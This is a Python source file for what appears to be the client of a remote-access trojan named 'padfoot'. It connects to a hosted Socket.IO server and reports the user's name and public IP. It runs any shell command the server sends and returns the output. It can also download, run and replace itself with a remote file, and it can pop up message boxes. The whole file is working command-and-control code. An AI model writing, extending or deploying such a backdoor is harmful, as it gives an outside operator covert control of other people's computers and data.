import socketio
import public_ip as ip
import json
import getpass
import os
import subprocess
import threading
import requests
import tkinter.messagebox as tkm

DEBUG = True

match DEBUG:
    case True:
        SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
    case False:
        SERVER = 'https://padfoot-server.onrender.com'

# Connect to the Socket.IO server
sio = socketio.Client()
late_return_list = ['messagebox']

def warn_late_return(command, data):
  return_data = {'output': f'late return warning from {getpass.getuser()}:\ncommand {command} will return late, as it is not an immediate return module.', 'returnAddress': data['returnAddress'], 'immediate': True, 'originalCommand': command}
  sio.emit('commandResponse', return_data)

def update(url, location, name, run, is_script):
  r = requests.get(url, allow_redirects=True)
  file_path = f'{location}/{name}'
  open(file_path, 'wb').write(r.content)

  if run:
    if is_script:
      subprocess.run(['python', file_path])
    else:
      subprocess.run([file_path])

    # Delete the currently running file (this script)
    try:
      os.remove(__file__)  # Delete the current script file
    except Exception as e:
      return f"Error deleting file: {e}"

def messagbox(title, message, type):
  match type:
    case 'info':
      return tkm.showinfo(title, message)
    case 'error':
      return tkm.showerror(title, message)
    case 'askokcancel':
      return tkm.askokcancel(title, message)
    case 'askyesnocancel':
      return tkm.askyesnocancel(title, message)
    case 'askquestion':
      return tkm.askquestion(title, message)
    case 'askretrycancel':
      return tkm.askretrycancel(title, message)
    case _:
      return 'no such messagebox: '+type

def execute_command(command, data):
  command_parts = command.split()
  if command_parts[0] == 'cd':
    if len(command_parts) > 1:
      try:
        os.chdir(command_parts[1])  # Change working directory
        output =  f"Changed working directory to: {os.getcwd()}"
      except Exception as e:
        output = str(e)
  else:
    try:
      output = subprocess.check_output(command, shell=True, text=True)
    except Exception as e:
      output = str(e)

  return_data = {'output': output, 'returnAddress': data['returnAddress'], 'immediate': True, 'originalCommand': command}
  sio.emit('commandResponse', return_data)


@sio.on('connect')
def on_connect():
  print('Connected to server')
  data = {'client': True, 'username': getpass.getuser(), 'ip': ip.get()} 
  sio.emit('establishment', data)
  

@sio.on('disconnect')
def on_disconnect():
    print('Disconnected from server')

@sio.on('command')
def command(data):
  if data['module']:
    execute_module(data['command'], data)
  else:      
    execute_command(data['command'], data)

def execute_module(command, data):
  command_parts = command.split(' ')
  main_command  = command_parts[1]
  repeat = int(command_parts[0])
  parameters = {}
  for i in range(len(command_parts)):
    if i >= 2:
      parameters[f'param{i-1}'] = command_parts[i]

  print(parameters)
  if main_command in late_return_list:
    warn_late_return(command, data)

  for i in range(repeat):
    match main_command:
      case 'update':
        output = update(command_parts[2], command_parts[3], command_parts[4], command_parts[5], command_parts[6]) #warning: untested
      case 'messagebox':
        messagebox_thread = threading.Thread(target=messagbox(command_parts[2], command_parts[3], command_parts[4]))
        messagebox_thread.start()
    return_data = {'output': output, 'returnAddress': data['returnAddress'], 'immediate': False, 'originalCommand': command}
    sio.emit('commandResponse', return_data)

# Start the connection
sio.connect(SERVER)

# Wait for the connection to establish
sio.wait()
